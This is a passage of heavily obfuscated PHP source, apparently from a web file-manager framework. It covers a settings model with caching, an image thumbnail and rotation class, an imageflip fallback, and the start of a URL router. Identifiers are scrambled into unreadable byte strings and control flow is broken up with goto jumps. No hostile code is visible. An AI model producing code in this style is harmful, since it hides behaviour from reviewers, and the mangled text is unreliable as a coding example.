"\x6d\157\x64\151\x66\x79\x54\151\x6d\145", $Aµ≈ãÀßö› = false) { $e¯œá¿ã∫◊ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$e¯œá¿ã∫◊) { return $døÀ™ ò¨≈ ? null : array(); } if (!$døÀ™ ò¨≈) { $e¯œá¿ã∫◊ = array_filter(array_values($e¯œá¿ã∫◊)); return array_sort_by($e¯œá¿ã∫◊, $câÜèàã Ã, $Aµ≈ãÀßö›); } return $e¯œá¿ã∫◊[$_SERVER[—Ω][361] . $døÀ™ ò¨≈]; } public function insert($B≠ﬂ∞ï∞∫«) { goto F‚ò û∫≤È; F‚ò û∫≤È: $eÇÌπ™êöÛ =& $_SERVER[—Ω]; $B≠ﬂ∞ï∞∫« = array_field_key($B≠ﬂ∞ï∞∫«, $this->field); $BïÓÓ’˘Ø† = Model($this->modelType)->get($eÇÌπ™êöÛ[362], $this->optionType . $eÇÌπ™êöÛ[363]); goto AëËñ‘áﬂ‚; AëËñ‘áﬂ‚: $BïÓÓ’˘Ø† = $BïÓÓ’˘Ø† ? $BïÓÓ’˘Ø† : 0; $B≠ﬂ∞ï∞∫«[$eÇÌπ™êöÛ[364]] = ++$BïÓÓ’˘Ø†; $B≠ﬂ∞ï∞∫«[$eÇÌπ™êöÛ[184]] = time(); goto dÒçöﬂë¥ö; cóúﬁñﬁœπ: return $BïÓÓ’˘Ø†; goto dÍëÂÑ·ò∏; dÒçöﬂë¥ö: $B≠ﬂ∞ï∞∫«[$eÇÌπ™êöÛ[107]] = time(); Model($this->modelType)->set($eÇÌπ™êöÛ[362], $BïÓÓ’˘Ø†, $this->optionType . $eÇÌπ™êöÛ[363]); Model($this->modelType)->set($eÇÌπ™êöÛ[361] . $BïÓÓ’˘Ø†, $B≠ﬂ∞ï∞∫«, $this->optionType); goto cóúﬁñﬁœπ; dÍëÂÑ·ò∏: } public function update($a¢ôµÿ’’“, $A£≈œ¬…ê∫) { goto dÇ∏±èüü˘; dÇ∏±èüü˘: $DºùÃ¥ôïé =& $_SERVER[—Ω]; $A£≈œ¬…ê∫ = array_field_key($A£≈œ¬…ê∫, $this->field); $dè•ÈöΩÉ’ = $this->listData($a¢ôµÿ’’“); goto B…‘¶Ôô√Ë; B…‘¶Ôô√Ë: if (!$dè•ÈöΩÉ’) { return !1; } $A£≈œ¬…ê∫ = array_merge($dè•ÈöΩÉ’, $A£≈œ¬…ê∫); $A£≈œ¬…ê∫[$DºùÃ¥ôïé[107]] = time(); goto A¨πìñëÒü; A¨πìñëÒü: return Model($this->modelType)->set($DºùÃ¥ôïé[361] . $a¢ôµÿ’’“, $A£≈œ¬…ê∫, $this->optionType); goto cè∑ŸØÍÙä; cè∑ŸØÍÙä: } public function remove($e∑ˆ¢âîÜµ) { return Model($this->modelType)->remove($_SERVER[—Ω][361] . $e∑ˆ¢âîÜµ, $this->optionType); } public function clear() { $aÁ°Æ¢ëµ» =& $_SERVER[—Ω]; Model($this->modelType)->remove($aÁ°Æ¢ëµ»[362], $this->optionType . $aÁ°Æ¢ëµ»[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Fé§È§ãúµ, $dê¶¶Ã§ƒ´) { if (!$dê¶¶Ã§ƒ´) { return !1; } $c°ë∫îéñê = $this->listData(); $c°ë∫îéñê = array_to_keyvalue($c°ë∫îéñê, $Fé§È§ãúµ); return isset($c°ë∫îéñê[$dê¶¶Ã§ƒ´]) ? $c°ë∫îéñê[$dê¶¶Ã§ƒ´] : !1; } public function findByName($aî©Ûﬂ”»É) { return $this->findByKey($_SERVER[—Ω][28], $aî©Ûﬂ”»É); } protected function resetData($Aæ≥∆≤ë»ﬂ) { $BæÕ”©–úÕ =& $_SERVER[—Ω]; $Aæ≥∆≤ë»ﬂ = is_array($Aæ≥∆≤ë»ﬂ) ? $Aæ≥∆≤ë»ﬂ : array(); $CâÆÑËä¯Ù = array(); for ($E≤ÊâçÖ∫° = 0; $E≤ÊâçÖ∫° < count($Aæ≥∆≤ë»ﬂ); $E≤ÊâçÖ∫°++) { $CâÆÑËä¯Ù[$BæÕ”©–úÕ[361] . $Aæ≥∆≤ë»ﬂ[$E≤ÊâçÖ∫°][$BæÕ”©–úÕ[364]]] = $Aæ≥∆≤ë»ﬂ[$E≤ÊâçÖ∫°]; } return Model($this->modelType)->set($CâÆÑËä¯Ù, !1, $this->optionType); } private function getAutoName($d˜èÎ€•©⁄) { $BÔÀΩ„Ñ∫à = array_to_keyvalue($this->listData(), $_SERVER[—Ω][28]); if (!$BÔÀΩ„Ñ∫à || !isset($BÔÀΩ„Ñ∫à[$d˜èÎ€•©⁄])) { return $d˜èÎ€•©⁄; } for ($fÁéàÇ»Ôı = 1; $fÁéàÇ»Ôı < count($BÔÀΩ„Ñ∫à); $fÁéàÇ»Ôı++) { $a⁄ˆΩÑ≤®ı = $d˜èÎ€•©⁄ . "\x28{$fÁéàÇ»Ôı}\x29"; if (!isset($BÔÀΩ„Ñ∫à[$a⁄ˆΩÑ≤®ı])) { return $a⁄ˆΩÑ≤®ı; } } return $a⁄ˆΩÑ≤®ı; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($E§–…ÑÊÇ = false, $F·ïÌ˜•úã = '', $E∞–”‡ã∏ˆ = false) { goto bí¿ÖÕŸ»’; Eﬂµä°öÁ: $d◊«√„Ûà§ = $this->where($C¨Ó´î©ñÒ)->select(); $d◊«√„Ûà§ = array_to_keyvalue($d◊«√„Ûà§, $EÁıìËÒ´π[89], $EÁıìËÒ´π[356]); foreach ($d◊«√„Ûà§ as $Fµáß¬òÏı => $f¶Ω∫ﬁÚ∂“) { if ($E∞–”‡ã∏ˆ || in_array($Fµáß¬òÏı, $this->jsonField)) { $d◊«√„Ûà§[$Fµáß¬òÏı] = json_decode($f¶Ω∫ﬁÚ∂“, !0); } } goto c§öØ¿´‰; då«–ÔíêÓ: $f¿–ìÆ’ÊÏ = is_array($f¿–ìÆ’ÊÏ) ? $f¿–ìÆ’ÊÏ : array(); if (is_array($d◊«√„Ûà§)) { $d◊«√„Ûà§ = array_merge($f¿–ìÆ’ÊÏ, $d◊«√„Ûà§); return $E§–…ÑÊÇ ? isset($d◊«√„Ûà§[$E§–…ÑÊÇ]) ? $d◊«√„Ûà§[$E§–…ÑÊÇ] : null : $d◊«√„Ûà§; } $C¨Ó´î©ñÒ = $this->filterWhere(array($EÁıìËÒ´π[29] => $F·ïÌ˜•úã)); goto Eﬂµä°öÁ; bí¿ÖÕŸ»’: $EÁıìËÒ´π =& $_SERVER[—Ω]; $d◊«√„Ûà§ = $this->cacheGet($F·ïÌ˜•úã); $f¿–ìÆ’ÊÏ = $this->optionDefault($F·ïÌ˜•úã); goto då«–ÔíêÓ; c§öØ¿´‰: $this->cacheSet($F·ïÌ˜•úã, $d◊«√„Ûà§); $d◊«√„Ûà§ = array_merge($f¿–ìÆ’ÊÏ, $d◊«√„Ûà§); return $E§–…ÑÊÇ ? $d◊«√„Ûà§[$E§–…ÑÊÇ] : $d◊«√„Ûà§; goto e–º«–ÉãÛ; e–º«–ÉãÛ: } public function set($däç§Œè¥¥, $d„öãÛÀ≥œ = false, $c¯Ï¢ÍøÛ® = '') { goto DÎ´€Üﬁ•à; DÎ´€Üﬁ•à: $b∞µ≈¨ﬂ“ =& $_SERVER[—Ω]; $this->cacheRemove($c¯Ï¢ÍøÛ®); $a◊¯ññÏßΩ = array(); goto D€ùÌåÊË·; D€ùÌåÊË·: $C‘Ôñ‰≤◊Í = is_array($däç§Œè¥¥) ? $däç§Œè¥¥ : array($däç§Œè¥¥ => $d„öãÛÀ≥œ); foreach ($C‘Ôñ‰≤◊Í as $E∆ñùÜËÕ¢ => $c‡ÂŸãΩÛÆ) { if (is_array($c‡ÂŸãΩÛÆ)) { $c‡ÂŸãΩÛÆ = json_encode_force($c‡ÂŸãΩÛÆ); } $this->checkLength($c‡ÂŸãΩÛÆ, !1, $this->tableName . $b∞µ≈¨ﬂ“[4] . $däç§Œè¥¥); $c‡ÂŸãΩÛÆ = self::textEncode($c‡ÂŸãΩÛÆ); $C‘Ôñ‰≤◊Í = array($b∞µ≈¨ﬂ“[29] => $c¯Ï¢ÍøÛ®, $b∞µ≈¨ﬂ“[89] => $E∆ñùÜËÕ¢, $b∞µ≈¨ﬂ“[356] => $c‡ÂŸãΩÛÆ); $a◊¯ññÏßΩ[] = $this->filterWhere($C‘Ôñ‰≤◊Í); } if (!$a◊¯ññÏßΩ) { return !0; } goto eíÊÃı´óÂ; eíÊÃı´óÂ: return $this->addAll($a◊¯ññÏßΩ, array(), !0); goto eôÜâª¡Õé; eôÜâª¡Õé: } protected function optionDefault($bôΩß¥èÛ≠ = '') { return !1; } public function setDeep($aÇ°èòò‹Ô, $aÇ≠Ô÷Òäí = false, $a™©Œ◊ô°Ü = '') { $aåœÈŸöœâ = explode($_SERVER[—Ω][93], $aÇ°èòò‹Ô); $DØíùÑ• Ñ = $this->get(); array_set_value($DØíùÑ• Ñ, $aÇ°èòò‹Ô, $aÇ≠Ô÷Òäí); $this->set($aåœÈŸöœâ[0], $DØíùÑ• Ñ[$aåœÈŸöœâ[0]], $a™©Œ◊ô°Ü); } public function remove($Aó”Ç‚ëÃ©, $a˜ƒÙ–ßÊæ = '') { $b©£äåúÔõ =& $_SERVER[—Ω]; $this->cacheRemove($a˜ƒÙ–ßÊæ); $dÑ√« ∞Ì§ = $this->filterWhere(array($b©£äåúÔõ[89] => $Aó”Ç‚ëÃ©, $b©£äåúÔõ[29] => $a˜ƒÙ–ßÊæ)); if (is_null($Aó”Ç‚ëÃ©)) { unset($dÑ√« ∞Ì§[$b©£äåúÔõ[89]]); } return $this->where($dÑ√« ∞Ì§)->delete(); } public function cacheSet($d»π´ô√Øõ, $cÂ¯”‘‰∞˘ = false) { return Cache::set($this->cacheKey($d»π´ô√Øõ), $cÂ¯”‘‰∞˘); } public function cacheGet($D√ÃùπÍäÇ) { return Cache::get($this->cacheKey($D√ÃùπÍäÇ)); } public function cacheRemove($fàñ£¥ÿ≈‘) { return Cache::remove($this->cacheKey($fàñ£¥ÿ≈‘)); } protected function filterWhere($A‚•‚¡£ˆ”) { return $A‚•‚¡£ˆ”; } protected function cacheKey($D§¿ÑÖí˜∆) { return $D§¿ÑÖí˜∆; } } goto Fè›ÉÕÏÒÇ; b´≠åŸáù±: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($F◊Àòîıä∫, $f£ÉØ◊∂Õ‡) { goto FˆÔäÛÆÓ; FˆÔäÛÆÓ: $this->srcFile = $F◊Àòîıä∫; $this->echoType = $f£ÉØ◊∂Õ‡; $this->im = self::image($F◊Àòîıä∫); goto CÆà…©ÑªÃ; fé‚ääøØ°: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto fë“ÒèËä∏; CÆà…©ÑªÃ: if (!$this->im) { return !1; } $b∏áÃæƒ…ø = $_SERVER[—Ω][33]; $this->imgData = GetImageSize($F◊Àòîıä∫, $b∏áÃæƒ…ø); goto fé‚ääøØ°; fë“ÒèËä∏: } public static function image($c•Öõù¿∞ã) { $F≥¯‚œÇµé =& $_SERVER[—Ω]; $CÍÛã…˜çº = $F≥¯‚œÇµé[33]; $F±≤Ï·ÍÑˆ = GetImageSize($c•Öõù¿∞ã, $CÍÛã…˜çº); $cÜÂëÑ”ùƒ = !1; switch ($F±≤Ï·ÍÑˆ[2]) { case IMAGETYPE_GIF: if (!function_exists($F≥¯‚œÇµé[1840])) { break; } $cÜÂëÑ”ùƒ = imagecreatefromgif($c•Öõù¿∞ã); break; case IMAGETYPE_JPEG: if (!function_exists($F≥¯‚œÇµé[1841])) { break; } $cÜÂëÑ”ùƒ = imagecreatefromjpeg($c•Öõù¿∞ã); break; case IMAGETYPE_PNG: if (!function_exists($F≥¯‚œÇµé[1842])) { break; } $cÜÂëÑ”ùƒ = @imagecreatefrompng($c•Öõù¿∞ã); imagesavealpha($cÜÂëÑ”ùƒ, !0); break; case IMAGETYPE_XBM: $cÜÂëÑ”ùƒ = imagecreatefromxbm($c•Öõù¿∞ã); break; case IMAGETYPE_WBMP: $cÜÂëÑ”ùƒ = imagecreatefromwbmp($c•Öõù¿∞ã); break; case IMAGETYPE_BMP: $cÜÂëÑ”ùƒ = imagecreatefrombmp($c•Öõù¿∞ã); break; default: break; } return $cÜÂëÑ”ùƒ; } public static function imageSize($BÒïÎçÛ‘†) { $B≥ÊÃÉµ¿∑ =& $_SERVER[—Ω]; $fΩØ¯øÙ´ˆ = GetImageSize($BÒïÎçÛ‘†); if (!$fΩØ¯øÙ´ˆ) { return !1; } return array($B≥ÊÃÉµ¿∑[1843] => $fΩØ¯øÙ´ˆ[0], $B≥ÊÃÉµ¿∑[1844] => $fΩØ¯øÙ´ˆ[1]); } function distortion($f≠çΩ™Ë•, $EÂÊ—ãÓ‚¢, $Bˆ££µÑï¬) { $AÌ±î”‘˘ = $this->creatImage($this->im, $EÂÊ—ãÓ‚¢, $Bˆ££µÑï¬, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($AÌ±î”‘˘, $f≠çΩ™Ë•); } function prorate($EıúâãØ®ﬁ, $dÁ≤¢èÔèæ, $FõË—Ïÿ€≥) { $aÚê–é›É = $dÁ≤¢èÔèæ / $FõË—Ïÿ€≥; $bòê¥ÇπÑΩ = $this->srcW / $this->srcH; if ($aÚê–é›É <= $bòê¥ÇπÑΩ) { $FÁÚÉ¡»äå = $dÁ≤¢èÔèæ; $a´§ã ◊Ì = $FÁÚÉ¡»äå * ($this->srcH / $this->srcW); } else { $a´§ã ◊Ì = $FõË—Ïÿ€≥; $FÁÚÉ¡»äå = $a´§ã ◊Ì * ($this->srcW / $this->srcH); } if ($this->srcW > $dÁ≤¢èÔèæ || $this->srcH > $FõË—Ïÿ€≥) { $d»ôÍîò∏é = $this->creatImage($this->im, $FÁÚÉ¡»äå, $a´§ã ◊Ì, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($d»ôÍîò∏é, $EıúâãØ®ﬁ); } else { $d»ôÍîò∏é = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($d»ôÍîò∏é, $EıúâãØ®ﬁ); } } function cut($CΩˆú¨π≈ü, $aÛƒ—·ìù„, $BŸŸñöΩüÏ) { goto F„ò™ÛÌ¿¥; e“ÀÉÿŒÌ◊: return $this->echoImage($dëÆÉÆÉ¶±, $CΩˆú¨π≈ü); goto fª±•Áßéã; F„ò™ÛÌ¿¥: $D¢†õΩ·Üﬁ = $aÛƒ—·ìù„ / $BŸŸñöΩüÏ; $cÛ‹•‰Ç”œ = $this->srcW / $this->srcH; if ($D¢†õΩ·Üﬁ <= $cÛ‹•‰Ç”œ) { $cÚÌ”›©àΩ = $BŸŸñöΩüÏ; $e’Û©œÍÁπ = $cÚÌ”›©àΩ * ($this->srcW / $this->srcH); } else { $e’Û©œÍÁπ = $aÛƒ—·ìù„; $cÚÌ”›©àΩ = $e’Û©œÍÁπ * ($this->srcH / $this->srcW); } goto AŒ´–– Áâ; AŒ´–– Áâ: $F®Æ…Ûí“â = $this->creatImage($this->im, $e’Û©œÍÁπ, $cÚÌ”›©àΩ, 0, 0, 0, 0, $this->srcW, $this->srcH); $dëÆÉÆÉ¶± = $this->creatImage($F®Æ…Ûí“â, $aÛƒ—·ìù„, $BŸŸñöΩüÏ, 0, 0, ($e’Û©œÍÁπ - $aÛƒ—·ìù„) / 2, ($cÚÌ”›©àΩ - $BŸŸñöΩüÏ) / 2, $aÛƒ—·ìù„, $BŸŸñöΩüÏ); imageDestroy($F®Æ…Ûí“â); goto e“ÀÉÿŒÌ◊; fª±•Áßéã: } function backFill($DöøËì∞∂ª, $eÇ√˘é°ÜÁ, $eÌöáé°òÎ, $f•¡∂ä”ñÕ = false, $f§§¨èßÒ = 255, $dÁ‡ÉÚ¡ê© = 255, $d“∏“È¶ñ“ = 255) { goto aüÏ¿ä±„Ê; aüÏ¿ä±„Ê: $bò¯ãƒêÁ† = $eÇ√˘é°ÜÁ / $eÌöáé°òÎ; $Dµ˘«ò≤ä≠ = $this->srcW / $this->srcH; if ($bò¯ãƒêÁ† <= $Dµ˘«ò≤ä≠) { $dÓÿˆ°˜ÓŸ = $eÇ√˘é°ÜÁ; $dƒƒÁªàÀΩ = $dÓÿˆ°˜ÓŸ * ($this->srcH / $this->srcW); } else { $dƒƒÁªàÀΩ = $eÌöáé°òÎ; $dÓÿˆ°˜ÓŸ = $dƒƒÁªàÀΩ * ($this->srcW / $this->srcH); } goto f¥›À≈£∞˘; Cõ€‹ÑÓãã: return $this->echoImage($aıù¶º£Œ«, $DöøËì∞∂ª); goto d∑πîãË≠€; f¥›À≈£∞˘: if (function_exists($_SERVER[—Ω][1845])) { @($aıù¶º£Œ« = imageCreateTrueColor($eÇ√˘é°ÜÁ, $eÌöáé°òÎ)); if (!$aıù¶º£Œ«) { $aıù¶º£Œ« = imageCreate($eÇ√˘é°ÜÁ, $eÌöáé°òÎ); } } else { $aıù¶º£Œ« = imageCreate($eÇ√˘é°ÜÁ, $eÌöáé°òÎ); } $b∂çäé√ÉÕ = ($eÌöáé°òÎ - $dƒƒÁªàÀΩ) / 2; $a¥·ªı◊Ü‹ = imagecolorallocate($aıù¶º£Œ«, $f§§¨èßÒ, $dÁ‡ÉÚ¡ê©, $d“∏“È¶ñ“); goto c§˜œ∑ºÊ»; c§˜œ∑ºÊ»: if ($f•¡∂ä”ñÕ) { $a¥·ªı◊Ü‹ = imageColorTransparent($aıù¶º£Œ«, $a¥·ªı◊Ü‹); $b∂çäé√ÉÕ = $eÌöáé°òÎ - $dƒƒÁªàÀΩ; } imageFilledRectangle($aıù¶º£Œ«, 0, 0, $eÇ√˘é°ÜÁ, $eÌöáé°òÎ, $a¥·ªı◊Ü‹); if ($this->srcW > $eÇ√˘é°ÜÁ || $this->srcH > $eÌöáé°òÎ) { $e≠é‚∞Îı⁄ = $this->creatImage($this->im, $dÓÿˆ°˜ÓŸ, $dƒƒÁªàÀΩ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($dÓÿˆ°˜ÓŸ < $eÇ√˘é°ÜÁ) { imageCopy($aıù¶º£Œ«, $e≠é‚∞Îı⁄, ($eÇ√˘é°ÜÁ - $dÓÿˆ°˜ÓŸ) / 2, 0, 0, 0, $dÓÿˆ°˜ÓŸ, $dƒƒÁªàÀΩ); } else { if ($dƒƒÁªàÀΩ < $eÌöáé°òÎ) { imageCopy($aıù¶º£Œ«, $e≠é‚∞Îı⁄, 0, $b∂çäé√ÉÕ, 0, 0, $dÓÿˆ°˜ÓŸ, $dƒƒÁªàÀΩ); } else { imageCopy($aıù¶º£Œ«, $e≠é‚∞Îı⁄, 0, 0, 0, 0, $dÓÿˆ°˜ÓŸ, $dƒƒÁªàÀΩ); } } } else { imageCopyMerge($aıù¶º£Œ«, $this->im, ($eÇ√˘é°ÜÁ - $dÓÿˆ°˜ÓŸ) / 2, $b∂çäé√ÉÕ, 0, 0, $dÓÿˆ°˜ÓŸ, $dƒƒÁªàÀΩ, 100); } goto Cõ€‹ÑÓãã; d∑πîãË≠€: } function creatImage($bé¯¬™êÉ‚, $Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ, $c∑ À¡ıâË, $b∏´íúºí«, $b§¬®Úá˘Ñ, $d†’¢òíÉî, $DŸÛá ‰≈ñ, $BâÓ˘Æî–¢) { if (function_exists($_SERVER[—Ω][1845])) { @($d ™≤”⁄ïÕ = ImageCreateTrueColor($Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ)); @imagealphablending($d ™≤”⁄ïÕ, !1); @imagesavealpha($d ™≤”⁄ïÕ, !0); if ($d ™≤”⁄ïÕ) { imageCopyResampled($d ™≤”⁄ïÕ, $bé¯¬™êÉ‚, $c∑ À¡ıâË, $b∏´íúºí«, $b§¬®Úá˘Ñ, $d†’¢òíÉî, $Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ, $DŸÛá ‰≈ñ, $BâÓ˘Æî–¢); } else { $d ™≤”⁄ïÕ = ImageCreate($Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ); imageCopyResized($d ™≤”⁄ïÕ, $bé¯¬™êÉ‚, $c∑ À¡ıâË, $b∏´íúºí«, $b§¬®Úá˘Ñ, $d†’¢òíÉî, $Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ, $DŸÛá ‰≈ñ, $BâÓ˘Æî–¢); } } else { $d ™≤”⁄ïÕ = ImageCreate($Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ); imageCopyResized($d ™≤”⁄ïÕ, $bé¯¬™êÉ‚, $c∑ À¡ıâË, $b∏´íúºí«, $b§¬®Úá˘Ñ, $d†’¢òíÉî, $Dª≈ëªÖ¥à, $C“ØáäÕ⁄Œ, $DŸÛá ‰≈ñ, $BâÓ˘Æî–¢); } return $d ™≤”⁄ïÕ; } public function imgRotate($Cò”¶¢˘Ñ˜, $Cüß∆›Â∏‚) { goto BÃ≈Ø÷©Ÿæ; BÃ≈Ø÷©Ÿæ: if (!$this->im || $Cüß∆›Â∏‚ % 360 === 0 || !function_exists($_SERVER[—Ω][1846])) { return !1; } $f“ó—ûÇ÷÷ = imageRotate($this->im, 360 - $Cüß∆›Â∏‚, 0); $bÀÿãô‚ÿû = !1; goto döÎ”°Û„£; döÎ”°Û„£: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $bÀÿãô‚ÿû = imagegif($f“ó—ûÇ÷÷, $Cò”¶¢˘Ñ˜); break; case IMAGETYPE_JPEG: $bÀÿãô‚ÿû = imagejpeg($f“ó—ûÇ÷÷, $Cò”¶¢˘Ñ˜, 100); break; case IMAGETYPE_PNG: $bÀÿãô‚ÿû = imagePNG($f“ó—ûÇ÷÷, $Cò”¶¢˘Ñ˜); break; default: break; } imageDestroy($f“ó—ûÇ÷÷); imageDestroy($this->im); goto cÊÁÑ⁄Ô… ; cÊÁÑ⁄Ô… : return $bÀÿãô‚ÿû; goto DÜ’¡π≥ó®; DÜ’¡π≥ó®: } function echoImage($EÃåÚ∂≤Èö, $Cã§’üÍÉ) { goto DÇ∏¯Ó±≥˜; D–≤÷•¢∞‡: imageDestroy($this->im); return $aµíÀÔæŸ; goto Bé«Òƒ‡√‚; C≠ƒ‹Ç‰…ÿ: $aµíÀÔæŸ = !1; switch ($this->echoType) { case $d‡Êê∫æ±∞[1847]: $aµíÀÔæŸ = imagePNG($EÃåÚ∂≤Èö); break; case $d‡Êê∫æ±∞[164]: $aµíÀÔæŸ = imagePNG($EÃåÚ∂≤Èö, $Cã§’üÍÉ); break; } imageDestroy($EÃåÚ∂≤Èö); goto D–≤÷•¢∞‡; DÇ∏¯Ó±≥˜: $d‡Êê∫æ±∞ =& $_SERVER[—Ω]; if (!$EÃåÚ∂≤Èö) { return !1; } ob_get_clean(); goto C≠ƒ‹Ç‰…ÿ; Bé«Òƒ‡√‚: } } if (!function_exists($_SERVER[—Ω][1848])) { define($_SERVER[—Ω][1849], 0); define($_SERVER[—Ω][1850], 1); define($_SERVER[—Ω][1851], 2); function imageflip($BÍû◊πÈ”Û, $C€Æò∂Û˜Ñ) { switch ($C€Æò∂Û˜Ñ) { case IMG_FLIP_HORIZONTAL: $Cﬂ§Üè¬ÆÑ = imagesx($BÍû◊πÈ”Û) - 1; $eëÜ∏·œ·ÿ = $Cﬂ§Üè¬ÆÑ / 2; $B◊éßò∞¡ª = imagesy($BÍû◊πÈ”Û); $e≥ì à‘÷Á = imageistruecolor($BÍû◊πÈ”Û) ? imagecreatetruecolor(1, $B◊éßò∞¡ª) : imagecreate(1, $B◊éßò∞¡ª); for ($EéÖﬁí°£ä = 0; $EéÖﬁí°£ä < $eëÜ∏·œ·ÿ; ++$EéÖﬁí°£ä) { imagecopy($e≥ì à‘÷Á, $BÍû◊πÈ”Û, 0, 0, $EéÖﬁí°£ä, 0, 1, $B◊éßò∞¡ª); imagecopy($BÍû◊πÈ”Û, $BÍû◊πÈ”Û, $EéÖﬁí°£ä, 0, $Cﬂ§Üè¬ÆÑ - $EéÖﬁí°£ä, 0, 1, $B◊éßò∞¡ª); imagecopy($BÍû◊πÈ”Û, $e≥ì à‘÷Á, $Cﬂ§Üè¬ÆÑ - $EéÖﬁí°£ä, 0, 0, 0, 1, $B◊éßò∞¡ª); } break; case IMG_FLIP_VERTICAL: $bû„Øë‰ÿ = imagesx($BÍû◊πÈ”Û); $c£¿“Îúûò = imagesy($BÍû◊πÈ”Û) - 1; $AˆÚ∆—–™Ï = $c£¿“Îúûò / 2; $e≥ì à‘÷Á = imageistruecolor($BÍû◊πÈ”Û) ? imagecreatetruecolor($bû„Øë‰ÿ, 1) : imagecreate($bû„Øë‰ÿ, 1); for ($bù©≠ì°ÿ‰ = 0; $bù©≠ì°ÿ‰ < $AˆÚ∆—–™Ï; ++$bù©≠ì°ÿ‰) { imagecopy($e≥ì à‘÷Á, $BÍû◊πÈ”Û, 0, 0, 0, $bù©≠ì°ÿ‰, $bû„Øë‰ÿ, 1); imagecopy($BÍû◊πÈ”Û, $BÍû◊πÈ”Û, 0, $bù©≠ì°ÿ‰, 0, $c£¿“Îúûò - $bù©≠ì°ÿ‰, $bû„Øë‰ÿ, 1); imagecopy($BÍû◊πÈ”Û, $e≥ì à‘÷Á, 0, $c£¿“Îúûò - $bù©≠ì°ÿ‰, 0, 0, $bû„Øë‰ÿ, 1); } break; case IMG_FLIP_BOTH: $bû„Øë‰ÿ = imagesx($BÍû◊πÈ”Û); $B◊éßò∞¡ª = imagesy($BÍû◊πÈ”Û); $e≥ì à‘÷Á = imagerotate($BÍû◊πÈ”Û, 180, 0); imagecopy($BÍû◊πÈ”Û, $e≥ì à‘÷Á, 0, 0, 0, 0, $bû„Øë‰ÿ, $B◊éßò∞¡ª); break; default: return; } imagedestroy($e≥ì à‘÷Á); } } if (!function_exists($_SERVER[—Ω][1852])) { function imagecreatefrombmp($B√ù˜ûÑã¥) { return ImageGdBMP::load($B√ù˜ûÑã¥); } } goto FÇö¶Õá·Ê; bã £Öû¬õ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\x2f\x5d\53", "\x3a\156\x75\155" => "\133\60\55\71\135\53", "\x3a\141\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($bí›”Â‚¢™, $DîÇä ÷›•) { $AÖÈ≥ÁçÑŸ =& $_SERVER[—Ω]; if ($bí›”Â‚¢™ == $AÖÈ≥ÁçÑŸ[1366]) { $Fæ©‰—ΩÇØ = array_map($AÖÈ≥ÁçÑŸ[1367], $DîÇä ÷›•[0]); $F∞Ë√ö≥÷â = strpos($DîÇä ÷›•[1], $AÖÈ≥ÁçÑŸ[8]) === 0 ? $DîÇä ÷›•[1] : $AÖÈ≥ÁçÑŸ[8] . $DîÇä ÷›•[1]; $fˆ≈€–œ≈ÿ = $DîÇä ÷›•[2]; } else { $Fæ©‰—ΩÇØ = null; $F∞Ë√ö≥÷â = strpos($DîÇä ÷›•[0], $AÖÈ≥ÁçÑŸ[8]) === 0 ? $DîÇä ÷›•[0] : $AÖÈ≥ÁçÑŸ[8] . $DîÇä ÷›•[0]; $fˆ≈€–œ≈ÿ = $DîÇä ÷›•[1]; } array_push(self::$maps, $Fæ©‰—ΩÇØ); array_push(self::$routes, $F∞Ë√ö≥÷â); array_push(self::$methods, strtoupper($bí›”Â‚¢™)); array_push(self::$callbacks, $fˆ≈€–œ≈ÿ); } public static function error($bû≠âÍ÷ç∫) { self::$errorCallback = $bû≠âÍ÷ç∫; } public static function haltOnMatch($a©∑Í√Íéë = true) { self::$halts = $a©∑Í√Íéë; } public static function dispatch() { goto a¶åΩÁƒƒ; A¬⁄öâœ∂∫: self::$routes = preg_replace($B∑∫‰©ÿŸÖ[1077], $B∑∫‰©ÿŸÖ[8], self::$routes); if (in_array($fäÖ–ÈëÂ‰, self::$routes)) { $CØ§Ô¯™µ› = array_keys(self::$routes, $fäÖ–ÈëÂ‰); foreach ($CØ§Ô¯™µ› as $BßºÇèªá“) { if (self::$methods[$BßºÇèªá“] == $B≥æƒ¢øæ∑ || self::$methods[$BßºÇèªá“] == $B∑∫‰©ÿŸÖ[1369] || in_array($B≥æƒ¢øæ∑, self::$maps[$BßºÇèªá“])) { $fÍ’Öå∞€⁄ = !0; if (!is_object(self::$callbacks[$BßºÇèªá“])) { $E„ÒÚêº⁄Ò = explode($B∑∫‰©ÿŸÖ[8], self::$callbacks[$BßºÇèªá“]); $C£àÕÔª¬Í = end($E„ÒÚêº⁄Ò); $e¯†á∫çâã = explode($B∑∫‰©ÿŸÖ[1370], $C£àÕÔª¬Í); $D¢ÿê¥∫Éè = new $e¯†á∫çâã[0](); $D¢ÿê¥∫Éè->{$e¯†á∫çâã[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$BßºÇèªá“]); if (self::$halts) { return; } } } } } else { $FÔà‡·óæã = 0; foreach (self::$routes as $BßºÇèªá“) { if (strpos($BßºÇèªá“, $B∑∫‰©ÿŸÖ[4]) !== !1) { $BßºÇèªá“ = str_replace($AèﬁèÍÚ∂È, $cªâºçÛú¡, $BßºÇèªá“); } if (preg_match($B∑∫‰©ÿŸÖ[1371] . $BßºÇèªá“ . $B∑∫‰©ÿŸÖ[1372], $fäÖ–ÈëÂ‰, $Fèá„Ëò”ì)) { if (self::$methods[$FÔà‡·óæã] == $B≥æƒ¢øæ∑ || 